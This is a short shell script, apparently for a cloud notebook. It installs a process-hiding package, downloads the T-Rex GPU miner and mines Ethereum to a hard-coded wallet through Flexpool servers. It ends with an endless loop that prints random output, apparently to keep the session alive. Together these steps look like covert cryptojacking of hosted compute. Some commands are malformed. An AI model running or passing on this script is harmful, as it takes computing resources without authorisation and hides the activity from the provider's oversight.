sudo apt update
sudo apt install screen -y
screen -dmS gr2.sh 89 95
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider
sudo apt install libpci3
sudo apt-get install screen
wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz -O - | tar -xz
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 stratum+ssl://eth-sg.flexpool.io:5555 -u 0x0F8824d694772df58840EDdD06a36526A0063438 -p x -w $ip --keep-gpu-busy 
while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
